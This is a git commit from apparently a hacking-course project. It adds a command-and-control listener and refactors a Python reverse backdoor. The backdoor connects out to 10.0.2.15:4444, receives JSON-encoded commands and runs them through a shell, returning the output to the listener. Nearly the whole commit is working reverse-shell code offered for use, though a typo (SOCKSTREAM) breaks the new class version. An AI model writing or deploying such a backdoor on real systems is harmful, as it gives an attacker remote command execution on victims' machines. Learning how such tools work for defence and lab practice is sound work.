9a81578607b4a35114ff661cd277f3431212b571
Jonathan Cohen <jcohen66@optonline.net>
2020-01-26 21:57:04 -0500

    Added json serde

---
+++ listener.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+
+import socket
+import json
+
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print('[+] Waiting for incoming connections.')
+        self.connection, self.address = listener.accept()
+        print('[+] Got a connection from: ' + str(self.address))
+
+    def debug(self, data):
+        print('************************')
+        print(data)
+        print('************************')
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data.decode('utf-8'))
+        print(json_data)
+        self.connection.send(json_data.encode('ASCII'))
+
+    def reliable_recieve(self):
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_remotely(self, command):
+        self.reliable_send(command)
+        return self.reliable_recieve()
+
+    def run(self):
+        while True:
+            command = input('>> ').encode('ASCII')
+            result = self.execute_remotely(command)
+            print(result)
+
+
+my_listener = Listener('10.0.2.15', 4444)
+my_listener.run()
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,19 +1,35 @@
 import socket
 import subprocess
+import json
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCKSTREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data.decode('utf-8'))
+        self.connection.send(json_data.encode('ASCII'))
+
+    def reliable_receive(self):
+        json_data = ''
+        while(True):
+            try:
+                json_data += self.connection.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            command_result = self.execute_system_command(command)
+            self.reliable_send(command_result)
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(('10.0.2.15', 4444))
-
-connection.send('\n[+] Connection established.\n')
-
-while True:
-    command = connection.recv(1024)
-    command_result = execute_system_command(command)
-    connection.send(command_result)
-
-connection.close()
+my_backdoor = Backdoor('10.0.2.15', 4444)
+my_backdoor.run()
